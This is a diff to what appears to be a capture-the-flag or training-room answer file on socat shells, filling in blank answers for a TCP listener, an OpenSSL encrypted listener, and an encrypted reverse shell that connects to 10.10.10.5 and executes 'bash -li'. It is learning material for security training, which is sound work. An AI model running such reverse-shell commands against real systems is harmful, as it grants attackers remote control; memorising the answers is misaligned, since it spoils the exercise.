@@ -322,7 +322,7 @@ If, at any point, a socat shell is not working correctly, it's well worth increa
 
 * How would we get socat to listen on TCP port 8080?
 
-	``
+	`tcp-l:8080`
 
 ## Task 7 - Socat Encrypted Shells
 
@@ -371,11 +371,11 @@ This technique will also work with the special, Linux-only TTY shell covered in 
 
 * What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
 
-	``
+	``socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0``
 
 * If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
 
-	``
+	`socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”,pty,stderr,sigint,setsid,sane`
 
 ## Task 8 - Common Shell Payloads
 
